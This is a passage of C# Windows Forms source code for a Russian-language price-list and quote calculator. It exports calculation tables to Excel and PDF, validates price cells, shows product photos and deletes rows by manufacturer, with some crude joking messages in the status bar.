                                        m_workSheet.Rows[i + 1].Columns[6] = null;
                                        if (color[10] == "Итого:")
                                        {
                                            m_workSheet.Rows[1].Columns[7] = "Цена";
                                            m_workSheet.Rows[1].Columns[8] = "Общая сумма";
                                        }
                                        if (color[10] == "Итого с НДС:")
                                        {
                                            m_workSheet.Rows[1].Columns[7] = "Цена с НДС";
                                            m_workSheet.Rows[1].Columns[8] = "Сумма с НДС";
                                        }
                                        if (color[10] == "Цена:")
                                        {
                                            m_workSheet.Rows[1].Columns[7] = "Цена";
                                            m_workSheet.Rows[1].Columns[8] = "Сумма";
                                        }
                                    }
                                }
                                catch { }
                            }
                        }
                        if (textBox_P_S.Text != null && textBox_P_S.Text != "")
                        {
                            dialog_mess("Перенос ps.");
                            m_workSheet.Rows[dataGridView_расчёт_2.RowCount + 2].Columns[1] = textBox_P_S.Text;

                            if (color[5] != "Transparent")
                            {
                                (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 1] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                                (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 2] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                                (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 3] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                                (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 4] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                                (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 5] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                                (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 6] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                                (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 7] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                                (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 8] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                                (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 9] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                            }






                        }
                        //дописываем коэф для менеджера.
                        if (comboBox_елупни.SelectedItem.ToString() != "" && была_нажата_расёт_и_цена_или_просто_расёт == true)   // && color[9] == "1")   - если через настройки замени этим
                        {
                            dialog_mess("Перенос имя манагера.");
                            m_workSheet.Rows[dataGridView_расчёт_2.RowCount + 3].Columns[7] = "Цена для:";
                            m_workSheet.Rows[dataGridView_расчёт_2.RowCount + 3].Columns[8] = comboBox_елупни.SelectedItem.ToString();
                        }


                        //меняем имя 1го листа:                      
                        m_workBook.Sheets[1].Name = listname;
                    }
                    finally
                    {
                        label_consol_2.Text = "Сохраняю данные в левом файле...";

                        dialog_mess("Дополняю лист в существующий файл");
                        Excel.Workbook xlWB2; //рабочая книга куда будем копировать лист
                        xlWB2 = m_app.Workbooks.Open(filename); //название файла Excel куда будем копировать лист
                        Excel.Worksheet xlSht; //лист Excel 
                        xlSht = m_workBook.Worksheets[1];
                        xlSht.Copy(After: xlWB2.Worksheets[xlWB2.Worksheets.Count]);  //сам процесс копирования листа из одного файла в другой  
                        xlWB2.Close(true);


                        // m_workBook.SaveCopyAs(filename); нихуя не сохраняем 
                        m_workBook.Close(false, "", null);
                        // Закрытие приложения Excel.
                        dialog_mess("Закрытие excel\nУбивить в озу");
                        try { m_app.Quit(); } catch { }

                        m_workBook = null;
                        m_workSheet = null;
                        rg = null;
                        m_app = null;
                        xlSht = null;
                        xlWB2 = null;

                        GC.Collect();
                        label_consol_2.Text = "Файл удачно дополнен. И лежит в: " + filename.ToString();
                    }
                }
                catch
                {
                    label_consol_2.Text = "У тебя крякнутый не полноценный Excel, кажись я не смогла закрыть файл.";
                }
                dialog_mess("Stop");
            }
            this.Text = "Прайс Дахмиры        источник:" + istohtik_bazi;
        }
        //это класс примера 2 вставки изображения не в ячейку
        private void releaseObject(object obj)
        {
            try
            {
                System.Runtime.InteropServices.Marshal.ReleaseComObject(obj);
                obj = null;
            }
            catch (Exception ex)
            {
                obj = null;
                MessageBox.Show("Unable to release the Object " + ex.ToString());
            }
            finally
            {
                GC.Collect();
            }
        }
        int xaxa2 = 0; // сохраняем в pdf через ексель с ценами
        int xaxa3 = 0; // сохраняем в pdf напрямую с ценами
        private void button_save_to_pdf2_Click(object sender, EventArgs e)
        {

            if (dataGridView_расчёт_2.CurrentRow == null)
            {
                if (xaxa3 == 0) { label_consol_2.Text = "Серьёзно? Нечего сохранять. Серьезно?"; xaxa3++; } else { xaxa3++; label_consol_2.Text = "Оцепись от этой кнопки!!!"; if (xaxa3 == 3) { label_consol_2.Text = "О%;ебись!!!"; } if (xaxa3 > 4) { xaxa3 = 0; } }
            }
            else
            {
                label_consol_2.Text = "Юзер решил вывести расчетку c ценами в читый PDF?";
                SaveFileDialog saveFileDialog1 = new SaveFileDialog(); //создание диалогового окна для выбора файла
                if (setting[21] != null && setting[21] != "") saveFileDialog1.InitialDirectory = setting[21];
                saveFileDialog1.Filter = "Табличка в PDF(.pdf)|*.pdf"; //формат загружаемого файла
                try
                {
                    if (saveFileDialog1.ShowDialog() == DialogResult.Cancel)
                        return;
                    // получаем выбранный файл
                    string filename = saveFileDialog1.FileName;
                    System.IO.FileInfo obj = new System.IO.FileInfo(filename); // получаем имя
                                                                               // ActiveForm.Text = obj.Name;
                    char[] MyChar33 = { '.', 'p', 'd', 'f' };
                    string Directory133 = obj.Name.TrimEnd(MyChar33); // путь к папке   

                    Document doc = new Document(iTextSharp.text.PageSize.LETTER, 10, 10, 42, 35);  //Document doc = new Document(iTextSharp.text.PageSize.LETTER, 10, 10, 42, 35);
                    PdfWriter wri = PdfWriter.GetInstance(doc, new FileStream(filename, FileMode.Create));
                    doc.Open();
                    PdfPTable table = new PdfPTable(dataGridView_расчёт_2.Columns.Count - 2);
                    string ttf = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Fonts), "ARIAL.TTF");
                    var baseFont = BaseFont.CreateFont(ttf, BaseFont.IDENTITY_H, BaseFont.NOT_EMBEDDED);
                    var font = new iTextSharp.text.Font(baseFont, iTextSharp.text.Font.STRIKETHRU, iTextSharp.text.Font.NORMAL);// iTextSharp.text.Font.DEFAULTSIZE - размер шрифта
                    Paragraph paragraph = new Paragraph("Расчет №:" + Directory133, font);
                    doc.Add(paragraph);
                    Paragraph paragraph1 = new Paragraph(" ", font);
                    doc.Add(paragraph1);
                    table.HorizontalAlignment = 0;
                    table.TotalWidth = 570f;
                    table.LockedWidth = true;

                    int[] col_s = new int[9];
                    int x = 0;
                    using (StreamReader stream = new StreamReader("rez\\Color_PDF.txt"))
                    {
                        while (stream.Peek() >= 0)
                        {
                            col_s[x] = Convert.ToInt16(stream.ReadLine());
                            x++;
                        }
                        stream.Close();
                    }

                    BaseColor color = new BaseColor(col_s[0], col_s[1], col_s[2]);
                    PdfPCell й1 = new PdfPCell(new Phrase("№", font));
                    й1.BackgroundColor = color;
                    table.AddCell(й1);
                    PdfPCell й2 = new PdfPCell(new Phrase("Производитель", font));
                    й2.BackgroundColor = color;
                    table.AddCell(й2);
                    PdfPCell й3 = new PdfPCell(new Phrase("Наименование", font));
                    й3.BackgroundColor = color;
                    table.AddCell(й3);
                    PdfPCell й4 = new PdfPCell(new Phrase("Артикул", font));
                    й4.BackgroundColor = color;
                    table.AddCell(й4);
                    PdfPCell й9 = new PdfPCell(new Phrase("Фото", font));
                    й9.BackgroundColor = color;
                    table.AddCell(й9);
                    PdfPCell й5 = new PdfPCell(new Phrase("Цена", font));
                    й5.BackgroundColor = color;
                    table.AddCell(й5);
                    PdfPCell й6 = new PdfPCell(new Phrase("Кол.", font));
                    й6.BackgroundColor = color;
                    table.AddCell(й6);
                    PdfPCell й7 = new PdfPCell(new Phrase("Общая цена", font));
                    й7.BackgroundColor = color;
                    table.AddCell(й7);
                    PdfPCell й8 = new PdfPCell(new Phrase("Примеч.", font));
                    й8.BackgroundColor = color;
                    table.AddCell(й8);
                    for (int i = 0; i < dataGridView_расчёт_2.Rows.Count - 1; i++)
                    {
                        if (dataGridView_расчёт_2[5, i].Value != null && dataGridView_расчёт_2[6, i].Value != null && dataGridView_расчёт_2[7, i].Value != null) //определяем не название графы ли в это строке? 
                        {
                            for (int k = 0; k < dataGridView_расчёт_2.Columns.Count - 2; k++)
                            {

                                if (k != 8)
                                {
                                    if (dataGridView_расчёт_2[k, i].Value != null)
                                    {
                                        if (dataGridView_расчёт_2[k, i].Value.ToString() != "System.Drawing.Bitmap" && dataGridView_расчёт_2[k, i].Value.ToString() != "System.Byte[]")
                                        {
                                            table.AddCell(new Paragraph(dataGridView_расчёт_2[k, i].Value.ToString(), font));
                                        }
                                        else
                                        {
                                            if (i == dataGridView_расчёт_2.Rows.Count - 1 && k == 4)
                                            {
                                                table.AddCell("");
                                            }
                                            else
                                            {
                                                iTextSharp.text.Image pic = iTextSharp.text.Image.GetInstance(dataGridView_расчёт_2[k, i].Value as Bitmap, System.Drawing.Imaging.ImageFormat.Jpeg);
                                                table.AddCell(pic);
                                            }
                                        }
                                    }
                                    else
                                    {
                                        table.AddCell(new Paragraph("", font));
                                    }
                                }
                                else
                                {
                                    if (dataGridView_расчёт_2[10, i].Value != null)
                                    {
                                        table.AddCell(new Paragraph(dataGridView_расчёт_2[10, i].Value.ToString(), font));
                                    }
                                    else
                                    {
                                        table.AddCell(new Paragraph("", font));
                                    }



                                }
                            }
                        }
                        else
                        {
                            BaseColor color1 = new BaseColor(col_s[3], col_s[4], col_s[5]);
                            for (int b = 0; b < 9; b++)
                            {
                                string dfws = "";
                                if (b < 4) { try { dfws = dataGridView_расчёт_2[b, i].Value.ToString(); } catch { } }
                                PdfPCell й53 = new PdfPCell(new Phrase(dfws, font));
                                й53.BackgroundColor = color1;
                                table.AddCell(й53);
                            }
                        }
                        float[] widths = new float[] { 25f, 90f, 165f, 90f, 45f, 50f, 40f, 50f, 45f };
                        table.SetWidths(widths);
                    }
                    if (dataGridView_расчёт_2[6, dataGridView_расчёт_2.Rows.Count - 1].Value != null || dataGridView_расчёт_2[7, dataGridView_расчёт_2.Rows.Count - 1].Value != null)
                    {
                        if (dataGridView_расчёт_2[0, dataGridView_расчёт_2.Rows.Count - 1].Value == null && dataGridView_расчёт_2[1, dataGridView_расчёт_2.Rows.Count - 1].Value == null && dataGridView_расчёт_2[2, dataGridView_расчёт_2.Rows.Count - 1].Value == null)
                        {
                            BaseColor color4 = new BaseColor(col_s[6], col_s[7], col_s[8]);
                            table.AddCell(new Paragraph("", font));
                            table.AddCell(new Paragraph("", font));
                            table.AddCell(new Paragraph("", font));
                            table.AddCell(new Paragraph("", font));
                            table.AddCell(new Paragraph("", font));
                            table.AddCell(new Paragraph("", font));
                            try
                            {
                                PdfPCell й12 = new PdfPCell(new Phrase(dataGridView_расчёт_2[6, dataGridView_расчёт_2.Rows.Count - 1].Value.ToString(), font));
                                й12.BackgroundColor = color4;
                                table.AddCell(й12);
                            }

                            catch { table.AddCell(new Paragraph("", font)); }
                            try
                            {
                                PdfPCell й13 = new PdfPCell(new Phrase(dataGridView_расчёт_2[7, dataGridView_расчёт_2.Rows.Count - 1].Value.ToString(), font));
                                й13.BackgroundColor = color4;
                                table.AddCell(й13);
                                table.AddCell(new Paragraph("", font));
                            }
                            catch
                            { table.AddCell(new Paragraph("", font)); }
                        }
                    }
                    doc.Add(table);
                    Paragraph paragraph2 = new Paragraph("    " + textBox_P_S.Text, font);
                    doc.Add(paragraph2);
                    doc.Close(); //Close document
                    label_consol_2.Text = "Файл удачно сохранен с ценами в PDF. И лежит в: " + filename.ToString();
                }
                catch
                {
                    DialogResult rezult = MessageBox.Show("Невозможно сохранить файл,\nнет доступа к папке,\nФаил сформировался с ошибками.\nНо может и сохранился. Залесь и проверь туда!", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    label_consol_2.Text = "Юзер передумал. Или не удалось сохранить.. Тут правды не найти.";
                }
            }
            this.Text = "Прайс Дахмиры        источник:" + istohtik_bazi;
        }
        int xaxa4 = 0; // сохраняем в pdf напрямую без цен
        private void button_save_to_pdf3_Click(object sender, EventArgs e)
        {
            if (dataGridView_расчёт_2.CurrentRow == null)
            {
                if (xaxa4 == 0) { label_consol_2.Text = "Серьёзно? Нечего сохранять. Серьезно?"; xaxa4++; } else { xaxa4++; label_consol_2.Text = "Оцепись от этой кнопки!!!"; if (xaxa4 == 3) { label_consol_2.Text = "О%;ебись!!!"; } if (xaxa4 > 4) { xaxa4 = 0; } }
            }
            else
            {
                label_consol_2.Text = "Юзер решил вывести расчетку без цен в чистый PDF?";
                SaveFileDialog saveFileDialog1 = new SaveFileDialog(); //создание диалогового окна для выбора файла
                if (setting[21] != null && setting[21] != "") saveFileDialog1.InitialDirectory = setting[21]; 
                saveFileDialog1.Filter = "Табличка в PDF(.pdf)|*.pdf"; //формат загружаемого файла
                try
                {
                    if (saveFileDialog1.ShowDialog() == DialogResult.Cancel)
                        return;
                    // получаем выбранный файл
                    string filename = saveFileDialog1.FileName;
                    System.IO.FileInfo obj = new System.IO.FileInfo(filename); // получаем имя

                    char[] MyChar = { '.', 'p', 'd', 'f' };
                    string Directory1 = obj.Name.TrimEnd(MyChar); // путь к папке   

                    Document doc = new Document(iTextSharp.text.PageSize.LETTER, 10, 10, 42, 35);  //Document doc = new Document(iTextSharp.text.PageSize.LETTER, 10, 10, 42, 35);
                    PdfWriter wri = PdfWriter.GetInstance(doc, new FileStream(filename, FileMode.Create));
                    doc.Open();
                    PdfPTable table = new PdfPTable(dataGridView_расчёт_2.Columns.Count - 4);
                    string ttf = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Fonts), "ARIAL.TTF");
                    var baseFont = BaseFont.CreateFont(ttf, BaseFont.IDENTITY_H, BaseFont.NOT_EMBEDDED);
                    var font = new iTextSharp.text.Font(baseFont, iTextSharp.text.Font.STRIKETHRU, iTextSharp.text.Font.NORMAL);// iTextSharp.text.Font.DEFAULTSIZE - размер шрифта
                    Paragraph paragraph = new Paragraph("Расчет №:" + Directory1, font);
                    doc.Add(paragraph);
                    Paragraph paragraph1 = new Paragraph(" ", font);
                    doc.Add(paragraph1);
                    table.HorizontalAlignment = 0;
                    table.TotalWidth = 570f;
                    table.LockedWidth = true;

                    int[] col_s = new int[9];
                    int x = 0;
                    using (StreamReader stream = new StreamReader("rez\\Color_PDF.txt"))
                    {
                        while (stream.Peek() >= 0)
                        {
                            col_s[x] = Convert.ToInt16(stream.ReadLine());
                            x++;
                        }
                        stream.Close();
                    }



                    BaseColor color = new BaseColor(col_s[0], col_s[1], col_s[2]);
                    PdfPCell й1 = new PdfPCell(new Phrase("№", font));
                    й1.BackgroundColor = color;
                    table.AddCell(й1);
                    PdfPCell й2 = new PdfPCell(new Phrase("Производитель", font));
                    й2.BackgroundColor = color;
                    table.AddCell(й2);
                    PdfPCell й3 = new PdfPCell(new Phrase("Наименование", font));
                    й3.BackgroundColor = color;
                    table.AddCell(й3);
                    PdfPCell й4 = new PdfPCell(new Phrase("Артикул", font));
                    й4.BackgroundColor = color;
                    table.AddCell(й4);
                    PdfPCell й9 = new PdfPCell(new Phrase("Фото", font));
                    й9.BackgroundColor = color;
                    table.AddCell(й9);
                    PdfPCell й6 = new PdfPCell(new Phrase("Кол.", font));
                    й6.BackgroundColor = color;
                    table.AddCell(й6);
                    PdfPCell й33 = new PdfPCell(new Phrase("Прим.", font));
                    й33.BackgroundColor = color;
                    table.AddCell(й33);

                    for (int i = 0; i < dataGridView_расчёт_2.Rows.Count - 1; i++)
                    {
                        if (dataGridView_расчёт_2[5, i].Value != null && dataGridView_расчёт_2[6, i].Value != null && dataGridView_расчёт_2[7, i].Value != null) //определяем не название графы ли в это строке? 
                        {

                            for (int k = 0; k < dataGridView_расчёт_2.Columns.Count - 2; k++)
                            {
                                if (k != 8)
                                {
                                    if (k != 5 && k != 7)
                                    {
                                        if (dataGridView_расчёт_2[k, i].Value != null)
                                        {
                                            if (dataGridView_расчёт_2[k, i].Value.ToString() != "System.Drawing.Bitmap" && dataGridView_расчёт_2[k, i].Value.ToString() != "System.Byte[]")
                                            {
                                                table.AddCell(new Paragraph(dataGridView_расчёт_2[k, i].Value.ToString(), font));
                                            }
                                            else
                                            {
                                                if (i == dataGridView_расчёт_2.Rows.Count - 1 && k == 4)
                                                {
                                                    table.AddCell("");
                                                }
                                                else
                                                {
                                                    iTextSharp.text.Image pic = iTextSharp.text.Image.GetInstance(dataGridView_расчёт_2[k, i].Value as Bitmap, System.Drawing.Imaging.ImageFormat.Jpeg);
                                                    table.AddCell(pic);
                                                }
                                            }
                                        }
                                        else
                                        {
                                            table.AddCell(new Paragraph("", font));
                                        }
                                    }
                                }
                                else
                                {
                                    if (dataGridView_расчёт_2[10, i].Value != null)
                                    {
                                        table.AddCell(new Paragraph(dataGridView_расчёт_2[10, i].Value.ToString(), font));
                                    }
                                    else
                                    {
                                        table.AddCell(new Paragraph("", font));
                                    }


                                }
                            }
                        }
                        else
                        {
                            BaseColor color1 = new BaseColor(col_s[3], col_s[4], col_s[5]);
                            for (int b = 0; b < 9; b++)
                            {
                                if (b != 5 && b != 7)
                                {
                                    string dfws = "";
                                    if (b < 4) { try { dfws = dataGridView_расчёт_2[b, i].Value.ToString(); } catch { } }
                                    PdfPCell й8 = new PdfPCell(new Phrase(dfws, font));
                                    й8.BackgroundColor = color1;
                                    table.AddCell(й8);
                                }
                            }
                        }
                        float[] widths = new float[] { 25f, 88f, 165f, 90f, 40f, 45f, 37f };
                        table.SetWidths(widths);
                    }

                    doc.Add(table);

                    Paragraph paragraph2 = new Paragraph("    " + textBox_P_S.Text, font);
                    doc.Add(paragraph2);

                    doc.Close(); //Close document

                    label_consol_2.Text = "Файл удачно сохранен без цен в PDF. И лежит в: " + filename.ToString();

                }
                catch
                {
                    DialogResult rezult = MessageBox.Show("Невозможно сохранить файл,\nнет доступа к папке,\nФаил сформировался с ошибками.\nНо может и сохранился. Залесь и проверь туда!", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    label_consol_2.Text = "Юзер передумал. Или не удалось сохранить.. Тут правды не найти.";
                }
            }
            this.Text = "Прайс Дахмиры        источник:" + istohtik_bazi;
        }
        private void tableDataGridView_CellEndEdit(object sender, DataGridViewCellEventArgs e)
        {  //tableDataGridView.CurrentCell.Value - текущее значение в ячейке которую выбирал пользователь
           //tableDataGridView.CurrentCell.RowIndex -выбранная строка пользователем
            try
            {
                string vedenoe_polzovatelem = tableDataGridView.Rows[(int)tableDataGridView.CurrentCell.RowIndex].Cells[5].Value.ToString();


                if (vedenoe_polzovatelem.Contains(","))
                {
                }
                else { vedenoe_polzovatelem = vedenoe_polzovatelem + ",0000"; }


                decimal newDecimal;
                bool isDecimal = Decimal.TryParse(vedenoe_polzovatelem, out newDecimal);
                string twoDecimalPlaces = newDecimal.ToString("########.0000");
                if (newDecimal < 1) { twoDecimalPlaces = "0" + twoDecimalPlaces; }
                tableDataGridView.Rows[(int)tableDataGridView.CurrentCell.RowIndex].Cells[5].Value = twoDecimalPlaces;

            }
            catch { }

        }

        private void tableDataGridView_DataError_1(object sender, DataGridViewDataErrorEventArgs e)
        {
            try
            {

                tableDataGridView[0, (int)tableDataGridView.CurrentCell.RowIndex].Style.BackColor = Color.FromArgb(255, 255, 20, 20);
                tableDataGridView[1, (int)tableDataGridView.CurrentCell.RowIndex].Style.BackColor = Color.FromArgb(255, 255, 20, 20);
                tableDataGridView[2, (int)tableDataGridView.CurrentCell.RowIndex].Style.BackColor = Color.FromArgb(255, 255, 20, 20);
                tableDataGridView[3, (int)tableDataGridView.CurrentCell.RowIndex].Style.BackColor = Color.FromArgb(255, 255, 20, 20);
                tableDataGridView[4, (int)tableDataGridView.CurrentCell.RowIndex].Style.BackColor = Color.FromArgb(255, 255, 20, 20);
                if (e.Exception != null)
                {
                    MessageBox.Show("Сюда нельзя вводить ' . '(точку) или текст, %,;,№,$...! испавь!\nТолько одну запятую, как разделитель" +
                        "!\nНе нравится? Вводи выше в окне:'Значение в строке базы'\nТам можно!!!");
                }

            }
            catch { }
        }

        private void tableDataGridView_CellValidated(object sender, DataGridViewCellEventArgs e)
        {
            tableDataGridView[0, (int)tableDataGridView.CurrentCell.RowIndex].Style.BackColor = Color.FromArgb(255, 255, 255, 255);
            tableDataGridView[1, (int)tableDataGridView.CurrentCell.RowIndex].Style.BackColor = Color.FromArgb(255, 255, 255, 255);
            tableDataGridView[2, (int)tableDataGridView.CurrentCell.RowIndex].Style.BackColor = Color.FromArgb(255, 255, 255, 255);
            tableDataGridView[3, (int)tableDataGridView.CurrentCell.RowIndex].Style.BackColor = Color.FromArgb(255, 255, 255, 255);
            tableDataGridView[4, (int)tableDataGridView.CurrentCell.RowIndex].Style.BackColor = Color.FromArgb(255, 255, 255, 255);

        }




        //Зарисовка "Пусто" в добавлении в прайс        
        private void textBox_new_артикул_Leave(object sender, EventArgs e)
        {
            if (textBox_new_артикул.Text == "") { textBox_new_артикул.Text = "Пусто"; }
            if (textBox_new_артикул.Text == null || textBox_new_артикул.Text == "Пусто" || textBox_new_артикул.Text == "")
            {
                textBox_new_артикул.BackColor = Color.MistyRose;
            }
            else
            {
                textBox_new_артикул.BackColor = Color.Empty;

            }
        }
        private void textBox_new_артикул_Enter(object sender, EventArgs e)
        {
            if (textBox_new_артикул.Text == "Пусто") { textBox_new_артикул.Text = ""; }
        }
        private void textBox_new_наименование_Enter(object sender, EventArgs e)
        {
            if (textBox_new_наименование.Text == "Пусто") { textBox_new_наименование.Text = ""; }
        }
        private void textBox_new_наименование_Leave(object sender, EventArgs e)
        {
            if (textBox_new_наименование.Text == "") { textBox_new_наименование.Text = "Пусто"; }
            if (textBox_new_наименование.Text == null || textBox_new_наименование.Text == "Пусто" || textBox_new_наименование.Text == "")
            {
                textBox_new_наименование.BackColor = Color.MistyRose;
            }
            else
            {
                textBox_new_наименование.BackColor = Color.Empty;

            }
        }
        private void textBox_new_производитель_Enter(object sender, EventArgs e)
        {
            if (textBox_new_производитель.Text == "Пусто") { textBox_new_производитель.Text = ""; }
        }
        private void textBox_new_производитель_Leave(object sender, EventArgs e)
        {
            if (textBox_new_производитель.Text == "") { textBox_new_производитель.Text = "Пусто"; }
            if (textBox_new_производитель.Text == null || textBox_new_производитель.Text == "Пусто" || textBox_new_производитель.Text == "")
            {
                textBox_new_производитель.BackColor = Color.MistyRose;
            }
            else
            {
                textBox_new_производитель.BackColor = Color.Empty;

            }
        }

        private void numericUpDown1_Enter(object sender, EventArgs e)
        {

        }

        private void numericUpDown1_Leave(object sender, EventArgs e)
        {

            if (numericUpDown1.Value == 0)
            {
                numericUpDown1.BackColor = Color.MistyRose;
            }
            else
            {
                numericUpDown1.BackColor = Color.Empty;

            }
        }
        //конец региона



        private void фотографияPictureBox_DoubleClick(object sender, EventArgs e)
        {// картинка в новом окне!
            Form form = new Form();
            form.Icon = System.Drawing.Icon.ExtractAssociatedIcon("ico.ico");   //this.Icon = Properties.Resources.youriconname;
            PictureBox pictureBox = new PictureBox();
            pictureBox.Dock = DockStyle.Fill;
            System.Drawing.Image image1 = фотографияPictureBox.Image;
            try
            {
                int x_высота_экрана = this.Height - this.Height / 2;
                if (image1.Width > (x_высота_экрана + 1)) { image1 = new Bitmap(image1, new Size(x_высота_экрана, (x_высота_экрана * image1.Height) / image1.Width)); }
                else { image1 = new Bitmap(image1, new Size((x_высота_экрана * image1.Width) / image1.Height, x_высота_экрана)); }

                pictureBox.Image = image1;
                form.Size = new Size(pictureBox.Image.Size.Width + 10, pictureBox.Image.Size.Height + 40);
                form.Controls.Add(pictureBox);
                pictureBox.SizeMode = PictureBoxSizeMode.Zoom;
                form.StartPosition = FormStartPosition.CenterScreen;
                form.MinimumSize = new Size(200, 200);
                form.MaximumSize = new Size(this.Width - 100, this.Height - 100);
                form.MaximizeBox = false;
                form.ShowInTaskbar = false;

                form.ShowDialog();

            }
            catch { }
        }

        private void pictureBox_new_image_DoubleClick(object sender, EventArgs e)
        {
            // картинка в новом окне!
            Form form = new Form();
            form.Icon = System.Drawing.Icon.ExtractAssociatedIcon("ico.ico");   //this.Icon = Properties.Resources.youriconname;
            PictureBox pictureBox = new PictureBox();
            pictureBox.Dock = DockStyle.Fill;
            System.Drawing.Image image1 = pictureBox_new_image.Image;


            int x_высота_экрана = this.Height - 300;
            if (image1.Height > this.Height - 300) { x_высота_экрана = this.Height - this.Height / 2; } else { x_высота_экрана = image1.Height; }

            if (image1.Width < (x_высота_экрана + 1))
            { image1 = new Bitmap(image1, new Size(x_высота_экрана, (x_высота_экрана * image1.Height) / image1.Width)); }

            else { image1 = new Bitmap(image1, new Size((x_высота_экрана * image1.Width) / image1.Height, x_высота_экрана)); }

            pictureBox.Image = image1;
            form.Size = new Size(pictureBox.Image.Size.Width + 10, pictureBox.Image.Size.Height + 40);
            form.Controls.Add(pictureBox);
            pictureBox.SizeMode = PictureBoxSizeMode.Zoom;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimumSize = new Size(200, 200);
            form.MaximumSize = new Size(this.Width, this.Height); ;
            form.MaximizeBox = false;
            form.ShowInTaskbar = false;
            form.ShowDialog();
        }

        private void toolStripButton_del_row_strip_Click(object sender, EventArgs e)
        {//удалить выделенную облость в базе
            if (open_window_otchetik == true)
            {
                label_consol.Text = "Там редактор повторов открыт! Закрой его.";
                return;
            }
            label_consol.Text = "Пользователь надумал удалить производителя из прайса.";
            string result = Microsoft.VisualBasic.Interaction.InputBox("Вы решили Удалить все строки \nс определенным именем из прайса! \nПожалуйста введите Имя производителя, \nкоторых следует удалить!\n\n\nПри вводе учитывается регистр и пробелы. ", "Кого удалить из прайса?", tableDataGridView.Rows[tableDataGridView.CurrentCell.RowIndex].Cells[1].Value.ToString());
            if (result != "")//если пользователь, что то родил в строку.
            {
                int ckoka = 0;
                for (int i = tableDataGridView.Rows.Count - 1; i >= 0; i--) //узнаем сколько повторов имени
                {
                    string iskom = "";
                    try { iskom = tableDataGridView.Rows[i].Cells[1].Value.ToString(); } catch { }
                    if (result == iskom)
                    {
                        ckoka++;
                    }
                }
                int[] ka = null;
                int b = 0;
                if (ckoka != 0) { ka = new int[ckoka]; } //делам массив с такой же длиной сколько строк повторов
                if (ka != null)    // если совпадение и масив вырос
                {
                    for (int i = tableDataGridView.Rows.Count - 1; i >= 0; i--) // заного бегаем по базе и помечаем в массив в каких строках было это имя!
                    {
                        string iskom = "";
                        try { iskom = tableDataGridView.Rows[i].Cells[1].Value.ToString(); } catch { }
                        if (result == iskom)
                        {
                            ka[b] = i;
                            b++;
                        }
                    }
                    for (int h = 0; h < ka.Length; h++) //запускам цикл объемом с массив и чистим эти строки.
                    {
                        int a = ka[h];
                        tableDataGridView.Rows.RemoveAt(a);
                    }
                }
            }
            else
            {
                label_consol.Text = "Пользователь передумал, или ничего не ввел в строку.";
            }

        }



        private void toolStripButton8_Click(object sender, EventArgs e)
        {
            try
            {
                dataGridView_муляж.Rows.RemoveAt(dataGridView_муляж.CurrentCell.RowIndex);
                label_consol_2.Text = "Удалено условие" + (dataGridView_муляж.CurrentCell.RowIndex + 1).ToString() + "         Всего строк условий: " + dataGridView_муляж.NewRowIndex.ToString();
            }
            catch
            {

                label_consol_2.Text = "Нечего удалять в условиях.";
            }
        }

 
        private void toolStripMenuItemрассчёткакопировать_Click(object sender, EventArgs e)
        {
            try
            {
                Clipboard.SetDataObject(this.dataGridView_муляж.GetClipboardContent());
            }
            catch { }
        }


        private void toolStripMenuItemрасчткавставить_Click(object sender, EventArgs e)
        {
            //если в буфере только 1 ячейка! то можно вставить в выделенное место!
            int r = dataGridView_муляж.SelectedCells[0].RowIndex;
            int c = dataGridView_муляж.SelectedCells[0].ColumnIndex;
            IDataObject dataInClipboard = Clipboard.GetDataObject();
            string stringInClipboard = (string)dataInClipboard.GetData(DataFormats.Text);
            char[] rowSplitter = { '\r', '\n' };
            try
            {
                string[] rowsInClipboard = stringInClipboard.Split(rowSplitter, StringSplitOptions.RemoveEmptyEntries);
                if (rowsInClipboard.Length == 1)
                {
                    string str = rowsInClipboard[0];
                    if (str.Contains('\t'))
                    { }
                    else
                    {
                        dataGridView_муляж.Rows[r].Cells[c].Value = rowsInClipboard[0];
                    }
                }
            }
            catch { }

        }

        #region меню

        private void новыйРасчетToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //запоминаем колличество и цену! 
            decimal цена = 0;
            int koll = 0;
            for (int i = 0; i < dataGridView_расчёт_2.NewRowIndex; i++)
            {
                try
                {
                    decimal fr = 0;
                    bool isDecimal1 = Decimal.TryParse(dataGridView_расчёт_2.Rows[i].Cells[7].Value.ToString(), out fr);
                    if (isDecimal1 == true) { цена = цена + fr; }
                }
                catch { }
                try
                {
                    int r = Convert.ToInt16(dataGridView_расчёт_2.Rows[i].Cells[6].Value.ToString());
                    koll = koll + r;
                }
                catch { }
            }
            if (dataGridView_расчёт_2.NewRowIndex == 0) { has_the_price_changed = 0; has_the_calculation_of_the_quantity_changed = 0; }

            if (has_the_price_changed != цена || has_the_calculation_of_the_quantity_changed != koll)
            {
                if (MessageBox.Show("Текущий расчет не сохранен. Он тебе нужен? ", "Сообщение", MessageBoxButtons.YesNo, MessageBoxIcon.Information) == DialogResult.Yes)
                {

                    сохранитьКакToolStripMenuItem.PerformClick();
                }

                dataGridView_расчёт_2.Rows.Clear();
                dataGridView_зависимость.Rows.Clear();
                label_rachetka.Text = "Расчетка: Новая";
                textBox_P_S.Text = "";
